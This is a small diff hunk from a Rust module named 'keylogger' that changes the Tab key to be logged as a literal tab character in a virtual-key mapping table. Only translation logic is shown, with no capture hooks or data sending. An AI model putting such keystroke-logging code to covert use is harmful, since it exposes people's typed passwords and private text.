@@ -53,7 +53,7 @@ pub mod keylogger {
         VK_BACK => Some(Key::Special("Backspace")),
         VK_RETURN => Some(Key::Char('\n')),
         VK_SPACE => Some(Key::Char(' ')),
-        VK_TAB => Some(Key::Special("Tab")),
+        VK_TAB => Some(Key::Char('\t')),
         VK_SHIFT | VK_LSHIFT | VK_RSHIFT => Some(Key::Special("Shift")),
         VK_CONTROL | VK_LCONTROL | VK_RCONTROL => Some(Key::Special("Control")),
         VK_ESCAPE => Some(Key::Special("Escape")),
